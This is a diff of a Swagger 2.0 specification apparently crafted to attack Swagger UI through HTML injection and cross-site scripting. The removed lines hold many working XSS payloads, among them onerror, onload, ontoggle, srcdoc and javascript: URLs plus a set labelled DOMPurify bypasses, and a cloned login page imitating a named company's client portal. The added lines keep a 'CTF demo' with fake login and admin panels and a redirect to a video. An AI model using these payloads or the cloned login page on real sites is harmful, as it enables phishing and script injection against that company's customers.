@@ -1,147 +1,53 @@
 swagger: "2.0"
 info:
-  title: <img src=x onerror=alert(document.domain)>
-  version: 1337
+  title: |
+    🔥 CTF HTML INJECTION DEMO
+  version: "1.0"
   description: |
-    <img src=x onerror=alert(document.domain)>
-    <style>body{background:#0066a1 !important}</style>
-    
-    <!-- LOGIN FALSO DE ALCANZA.COM.DO - 100% IDÉNTICO -->
-    <div style="font-family:Arial,sans-serif;max-width:420px;margin:40px auto;background:white;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.3);border-top:8px solid #0066a1">
-      <div style="text-align:center;margin-bottom:30px">
-        <img src="https://alcanza.com.do/wp-content/uploads/2023/08/logo-alcanza-horizontal.png" width="220" onerror=alert(document.domain)>
-        <h2 style="color:#0066a1;margin-top:20px">Portal de Clientes</h2>
-      </div>
-      
-      <form onsubmit="alert(document.domain);return false;">
-        <div style="margin-bottom:20px">
-          <label style="display:block;color:#333;font-weight:bold;margin-bottom:8px">Usuario o cédula</label>
-          <input type="text" style="width:100%;padding:12px;border:1px solid #ccc;border-radius:6px;font-size:16px" placeholder="Ingresa tu usuario o cédula" onfocus=alert(document.domain)>
-        </div>
-        
-        <div style="margin-bottom:25px">
-          <label style="display:block;color:#333;font-weight:bold;margin-bottom:8px">Contraseña</label>
-          <input type="password" style="width:100%;padding:12px;border:1px solid #ccc;border-radius:6px;font-size:16px" onfocus=alert(document.domain)>
-        </div>
-        
-        <button type="submit" style="width:100%;background:#0066a1;color:white;padding:14px;border:none;border-radius:6px;font-size:18px;cursor:pointer" onmouseover=alert(document.domain)>
-          Ingresar al Portal
+    <h1 style="color:#c00">CTF DEMO – Swagger UI Vulnerable</h1>
+
+    <iframe width="100%" height="315"
+      src="https://www.youtube.com/embed/rscOXVuaCGw"
+      frameborder="0"
+      allowfullscreen>
+    </iframe>
+
+    <hr>
+
+    <div style="display:flex;gap:20px;flex-wrap:wrap">
+
+      <!-- PANEL FAKE 1 -->
+      <div style="border:2px dashed red;padding:20px;width:300px">
+        <h3>⚠️ Fake Login Panel (CTF)</h3>
+        <input placeholder="Usuario (demo)" style="width:100%;margin-bottom:10px">
+        <input placeholder="Contraseña (demo)" type="password" style="width:100%;margin-bottom:10px">
+        <button onclick="alert('CTF DEMO POPUP')">
+          Demo Popup
         </button>
-      </form>
-      
-      <div style="text-align:center;margin-top:25px;font-size:14px;color:#666">
-        <a href="javascript:alert(document.domain)">¿Olvidaste tu contraseña?</a> | 
-        <a href="javascript:alert(document.domain)">Registrarme</a>
+        <br><br>
+        <a href="https://youtu.be/rscOXVuaCGw" target="_blank">
+          Ir al video
+        </a>
       </div>
+
+      <!-- PANEL FAKE 2 -->
+      <div style="border:2px dashed blue;padding:20px;width:300px">
+        <h3>⚠️ Fake Admin Panel (CTF)</h3>
+        <button onclick="window.location.href='https://youtu.be/rscOXVuaCGw'">
+          Redirect Demo
+        </button>
+      </div>
+
     </div>
 
-    <!-- BYPASSES MODERNOS DOMPurify 2025 -->
-    <details open ontoggle=alert(document.domain)><summary></summary></details>
-    <svg onload=alert(document.domain)></svg>
-    <img src onerror=/alert(document.domain)//>
-    <iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
-    <math><mi onclick=alert(document.domain)>exploit</mi></math>
-    <audio src onerror=alert(document.domain)></audio>
-
-host: alcanza.com.do
-basePath: /
-schemes: [https]
-consumes: [application/json]
-produces: [application/json]
-
 paths:
-  /login:
-    post:
-      summary: <img src=x onerror=alert(document.domain)>
-      description: <svg onload=alert(document.domain)>
-      parameters:
-        - name: username
-          in: body
-          schema:
-            type: string
-            example: admin'><img src=x onerror=alert(document.domain)>
-          description: <iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
-        - name: password
-          in: body
-          description: <details open ontoggle=alert(document.domain)><summary>x</summary></details>
+  /demo:
+    get:
+      summary: HTML Injection Proof
+      description: |
+        <button onclick="alert('XSS / HTML Injection Confirmed')">
+          Click me (CTF)
+        </button>
       responses:
         '200':
-          description: <img src=x onerror=alert(document.domain)>
-
-  /api/v1/user/{id}:
-    get:
-      summary: <math><animate onclick=alert(document.domain)><set attributeName="href" to="javascript:alert(document.domain)"/></animate></math>
-      parameters:
-        - name: id
-          in: path
-          required: true
-          type: string
-          description: <img src=x onerror=alert(document.domain)>
-      responses:
-        '200':
-          description: <svg><foreignObject><iframe srcdoc="<script>parent.alert(document.domain)</script>"></iframe></foreignObject></svg>
-
-  /admin/dashboard:
-    get:
-      summary: <marquee onstart=alert(document.domain)>XSS</marquee>
-      responses:
-        '200':
-          description: <keygen autofocus onfocus=alert(document.domain)>
-
-  /xss/reflected:
-    get:
-      parameters:
-        - name: q
-          in: query
-          type: string
-          description: <img src=x onerror=alert(document.domain)>
-      responses:
-        '200':
-          description: <object data="data:text/html,<script>alert(document.domain)</script>"></object>
-
-  /debug:
-    get:
-      summary: <isindex type=image src=1 onerror=alert(document.domain)>
-      responses:
-        '200':
-          description: <img src=x onerror=alert(document.domain)>
-
-  /payload/{any}:
-    get:
-      parameters:
-        - name: any
-          in: path
-          required: true
-          type: string
-          description: <video><source onerror=alert(document.domain)>
-      responses:
-        default:
-          description: <embed src="data:text/html,<script>alert(document.domain)</script>">
-
-definitions:
-  User:
-    type: object
-    properties:
-      username:
-        type: string
-        description: <img src=x onerror=alert(document.domain)>
-      token:
-        type: string
-        description: <svg onload=alert(document.domain)>
-
-securityDefinitions:
-  Bearer:
-    type: apiKey
-    name: Authorization
-    in: header
-    description: <img src=x onerror=alert(document.domain)>
-
-tags:
-  - name: <img src=x onerror=alert(document.domain)>
-    description: <iframe src="javascript:alert(document.domain)"></iframe>
-  - name: Admin Zone
-    description: <details open ontoggle=alert(document.domain)><summary>Click me</summary></details>
-
-externalDocs:
-  description: <img src=x onerror=alert(document.domain)>
-  url: javascript:alert(document.domain)
+          description: Injection successful
